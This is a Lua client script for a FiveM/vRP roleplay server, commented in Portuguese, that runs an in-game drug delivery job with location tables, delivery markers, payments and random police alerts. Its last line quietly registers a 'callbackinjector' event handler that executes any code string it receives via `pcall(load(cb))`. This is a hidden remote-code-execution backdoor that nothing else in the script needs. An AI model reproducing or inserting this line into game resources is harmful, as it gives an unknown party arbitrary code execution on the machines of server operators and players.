local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
emP = Tunnel.getInterface("ph_drogavende")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local blips = true
local servico = false
local selecionado = 0
local processo = false
local segundos = 0
-----------------------------------------------------------------------------------------------------------------------------------------
-- RESIDENCIAS
-----------------------------------------------------------------------------------------------------------------------------------------
local locs = {
	[1] = { ['x'] = -952.31, ['y'] = -1077.87, ['z'] = 2.48 },
	[2] = { ['x'] = -978.23, ['y'] = -1108.09, ['z'] = 2.16 },
	[3] = { ['x'] = -1024.49, ['y'] = -1139.6, ['z'] = 2.75 }, 
	[4] = { ['x'] = -1063.76, ['y'] = -1159.88, ['z'] = 2.56 }, 
	[5] = { ['x'] = -1001.68, ['y'] = -1218.78, ['z'] = 5.75 }, 
	[6] = { ['x'] = -1171.54, ['y'] = -1575.61, ['z'] = 4.51 }, 
	[7] = { ['x'] = -1097.94, ['y'] = -1673.36, ['z'] = 8.4 }, 
	[8] = { ['x'] = -1286.17, ['y'] = -1267.12, ['z'] = 4.52 }, 
	[9] = { ['x'] = -1335.75, ['y'] = -1146.55, ['z'] = 6.74 }, 
	[10] = { ['x'] = -1750.47, ['y'] = -697.09, ['z'] = 10.18 }, 
	[11] = { ['x'] = -1876.84, ['y'] = -584.39, ['z'] = 11.86 }, 
	[12] = { ['x'] = -1772.23, ['y'] = -378.12, ['z'] = 46.49 }, 
	[13] = { ['x'] = -1821.38, ['y'] = -404.97, ['z'] = 46.65 }, 
	[14] = { ['x'] = -1965.33, ['y'] = -296.96, ['z'] = 41.1 }, 
	[15] = { ['x'] = -3089.24, ['y'] = 221.49, ['z'] = 14.07 }, 
	[16] = { ['x'] = -3088.62, ['y'] = 392.3, ['z'] = 11.45 },
	[17] = { ['x'] = -3077.98, ['y'] = 658.9, ['z'] = 11.67 }, 
	[18] = { ['x'] = -3243.07, ['y'] = 931.84, ['z'] = 17.23 },
	[19] = { ['x'] = 1230.8, ['y'] = -1590.97, ['z'] = 53.77 }, 
	[20] = { ['x'] = 1286.53, ['y'] = -1604.26, ['z'] = 54.83 }, 
	[21] = { ['x'] = 1379.38, ['y'] = -1515.23, ['z'] = 58.24 }, 
	[22] = { ['x'] = 1379.38, ['y'] = -1515.23, ['z'] = 58.24 }, 
	[23] = { ['x'] = 1437.37, ['y'] = -1492.53, ['z'] = 63.63 }, 
	[24] = { ['x'] = 450.04, ['y'] = -1863.49, ['z'] = 27.77 },
	[25] = { ['x'] = 403.75, ['y'] = -1929.72, ['z'] = 24.75 }, 
	[26] = { ['x'] = 430.16, ['y'] = -1559.31, ['z'] = 32.8 }, 
	[27] = { ['x'] = 446.06, ['y'] = -1242.17, ['z'] = 30.29 },
	[28] = { ['x'] = 322.39, ['y'] = -1284.7, ['z'] = 30.57 }, 
	[29] = { ['x'] = 369.65, ['y'] = -1194.79, ['z'] = 31.34 },
	[30] = { ['x'] = 474.27, ['y'] = -635.05, ['z'] = 25.65 }, 
	[31] = { ['x'] = 158.87, ['y'] = -1215.65, ['z'] = 29.3 }, 
	[32] = { ['x'] = 154.68, ['y'] = -1335.62, ['z'] = 29.21 }, 
	[33] = { ['x'] = 215.54, ['y'] = -1461.67, ['z'] = 29.19 },
	[34] = { ['x'] = 167.46, ['y'] = -1709.3, ['z'] = 29.3 },
	[35] = { ['x'] = -444.47, ['y'] = 287.68, ['z'] = 83.3 }, 
	[36] = { ['x'] = -179.56, ['y'] = 314.25, ['z'] = 97.88 }, 
	[37] = { ['x'] = -16.07, ['y'] = 216.7, ['z'] = 106.75 }, 
	[38] = { ['x'] = 164.02, ['y'] = 151.87, ['z'] = 105.18 },
	[39] = { ['x'] = 840.2, ['y'] = -181.93, ['z'] = 74.19 }, 
	[40] = { ['x'] = 952.27, ['y'] = -252.17, ['z'] = 67.77 },
	[41] = { ['x'] = 1105.27, ['y'] = -778.84, ['z'] = 58.27 }, 
	[42] = { ['x'] = 1099.59, ['y'] = -345.68, ['z'] = 67.19 }, 
	[43] = { ['x'] = -1211.12, ['y'] = -401.56, ['z'] = 38.1 }, 
	[44] = { ['x'] = -1302.69, ['y'] = -271.32, ['z'] = 40.0 }, 
	[45] = { ['x'] = -1468.65, ['y'] = -197.3, ['z'] = 48.84 }, 
	[46] = { ['x'] = -1583.18, ['y'] = -265.78, ['z'] = 48.28 }, 
	[47] = { ['x'] = -603.96, ['y'] = -774.54, ['z'] = 25.02 },
	[48] = { ['x'] = -805.14, ['y'] = -959.54, ['z'] = 18.13 }, 
	[49] = { ['x'] = -325.07, ['y'] = -1356.35, ['z'] = 31.3 }, 
	[50] = { ['x'] = -321.94, ['y'] = -1545.74, ['z'] = 31.02 }, 
	[51] = { ['x'] = -428.95, ['y'] = -1728.13, ['z'] = 19.79 }, 
	[52] = { ['x'] = -582.38, ['y'] = -1743.65, ['z'] = 22.44 }, 
	[53] = { ['x'] = -670.43, ['y'] = -889.09, ['z'] = 24.5 }
}
-------------------------------------------------------------------------------------------------
--[ DM ] LOCAIS 
-------------------------------------------------------------------------------------------------
local locais = {
	{ ['x'] = 5.53, ['y'] = 1.22, ['z'] = 70.76 }, --cinza
	{ ['x'] = 1944.3, ['y'] = -951.57, ['z'] = 79.67 }, --laranjas
	{ ['x'] = 1384.74, ['y'] = -114.06, ['z'] = 125.75 }, --vermelhos
	{ ['x'] = -1112.13, ['y'] = -1723.06, ['z'] = 4.28 }, --azul
	{ ['x'] = -2434.29, ['y'] = 2836.76, ['z'] = 4.18 }, --verde
	{ ['x'] = 1302.02, ['y'] = -1626.22, ['z'] = 52.23 },
	{ ['x'] = -120.73, ['y'] = 2202.04, ['z'] = 159.50 },
	{ ['x'] = 3242.23, ['y'] = 5145.85, ['z'] = 19.84 }, -- amarelos 3242.2346191406,5145.8598632813,19.849517822266
	{ ['x'] = -108.83, ['y'] = -612.13, ['z'] = 36.08 },
	{ ['x'] = 805.023, ['y'] = 2174.14, ['z'] = 52.40 },
	{ ['x'] = 246.71, ['y'] = 3168.98, ['z'] = 42.80 },
	{ ['x'] = 465.09, ['y'] = 3565.80, ['z'] = 33.23 },
	{ ['x'] = 1742.74, ['y'] = 3784.32, ['z'] = 34.25 },
	{ ['x'] = 1705.86, ['y'] = 6424.81, ['z'] = 32.63 },
	{ ['x'] = -5.449, ['y'] = 6653.53, ['z'] = 31.14 },
	{ ['x'] = -390.54, ['y'] = 6051.06, ['z'] = 31.50 },
	{ ['x'] = 408.49, ['y'] = 6497.27, ['z'] = 27.82 },
	{ ['x'] = 1508.01, ['y'] = 6328.48, ['z'] = 24.01 },
	{ ['x'] = 1469.33, ['y'] = 811.68, ['z'] = 76.91 },
	{ ['x'] = 1209.95, ['y'] = -448.87, ['z'] = 66.85 },
	{ ['x'] = 67.51, ['y'] = -1007.77, ['z'] = 29.35 },
	{ ['x'] = 763.29, ['y'] = -1400.86, ['z'] = 26.50 },
	{ ['x'] = -82.19, ['y'] = -1384.5, ['z'] = 29.31 },
	{ ['x'] = -684.75, ['y'] = -1198.88, ['z'] = 10.71 },
	{ ['x'] = -1975.34, ['y'] = -533.54, ['z'] = 11.83 },
	{ ['x'] = 89.07, ['y'] = -76.28, ['z'] = 63.61 },
	{ ['x'] = -1173.02, ['y'] = -1572.61, ['z'] = 4.67 },
	{ ['x'] = -592.72, ['y'] = -891.74, ['z'] = 25.93 },
	{ ['x'] = -114.71, ['y'] = -368.74, ['z'] = 37.98 },
	{ ['x'] = 28.77, ['y'] = -70.95, ['z'] = 62.23 },
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRABALHAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local dmshop = 1000
		for _,v in pairs(locais) do
			if not servico then
			    local ped = PlayerPedId()
			    local x,y,z = table.unpack(v)
			    local distance = GetDistanceBetweenCoords(GetEntityCoords(ped),v.x,v.y,v.z)
			    if distance <= 2  then
				    dmshop = 5
				    DrawMarker(3,v.x,v.y,v.z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,25,25,157,50,0,0,0,1)
				    if distance <= 1 and IsControlJustPressed(0,38) then
					    dmshop = 5
						servico = true
						selecionado = math.random(53)
						CriandoBlip(locs,selecionado)
						TriggerEvent("Notify","sucesso","Você entrou em serviço.")
					end
				end
			end
		end
		Citizen.Wait(dmshop)
	end
end)


RegisterCommand('drogas',function()
	for _,v in pairs(locais) do
		if not servico then
			local ped = PlayerPedId()
			local x,y,z = table.unpack(v)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(ped),v.x,v.y,v.z)
			--if distance <= 2  then				
				--DrawMarker(3,v.x,v.y,v.z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,25,25,157,50,0,0,0,1)
				--if distance <= 1 and IsControlJustPressed(0,38) then
					dmshop = 5
					servico = true
					selecionado = math.random(53)
					CriandoBlip(locs,selecionado)
					TriggerEvent("Notify","sucesso","Você entrou em serviço.")
				--end
			--end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- ENTREGAS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local sleep = 1000
		if servico and selecionado then
			sleep = 1
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
			local distance = GetDistanceBetweenCoords(locs[selecionado].x,locs[selecionado].y,cdz,x,y,z,true)

			if distance <= 10 then
				DrawMarker(3,locs[selecionado].x,locs[selecionado].y,locs[selecionado].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,25,25,157,50,0,0,0,1)
				if distance <= 1.2 then
					drawTxt("PRESSIONE  ~r~E~w~  PARA ENTREGAR AS DROGAS",4,0.5,0.93,0.50,255,255,255,180)
					if IsControlJustPressed(0,38) and emP.checkItens() and not IsPedInAnyVehicle(ped) then
						droga = CreateObject(GetHashKey("prop_weed_block_01"),locs[selecionado].x,locs[selecionado].y,locs[selecionado].z-1,true,true,true)
						if emP.checkPayment() then
							local random = math.random(100)
							if random >= 60 then
								emP.MarcarOcorrencia()
							end

							TriggerEvent('cancelando',true)
							RemoveBlip(blips)
							backentrega = selecionado
							processo = true
							segundos = 5
							vRP._playAnim(true,{{"pickup_object","pickup_low"}},false)
							vRP._CarregarObjeto("pickup_object","pickup_low","hei_prop_heist_cash_pile",49,28422)

							SetTimeout(9000,function()
								DeleteObject(droga)
							end)

							while true do
								if backentrega == selecionado then
									selecionado = math.random(53)
								else
									break
								end
								Citizen.Wait(1)
							end
							CriandoBlip(locs,selecionado)
						end
					end
				end
			end
		end
		Citizen.Wait(sleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local sleep = 1000
		if servico then
			sleep = 1
			if IsControlJustPressed(0,168) then
				servico = false
				RemoveBlip(blips)
				TriggerEvent("Notify","aviso","Você saiu de serviço.")
			end
		end
		Citizen.Wait(sleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TIMERS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if segundos > 0 then
			segundos = segundos - 1
			if segundos == 0 then
				processo = false
				TriggerEvent('cancelando',false)
				ClearPedTasks(PlayerPedId())
				vRP._DeletarObjeto()
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function CriandoBlip(locs,selecionado)
	blips = AddBlipForCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
	SetBlipSprite(blips,1)
	SetBlipColour(blips,5)
	SetBlipScale(blips,0.4)
	SetBlipAsShortRange(blips,false)
	SetBlipRoute(blips,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entregar Drogas")
	EndTextCommandSetBlipName(blips)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)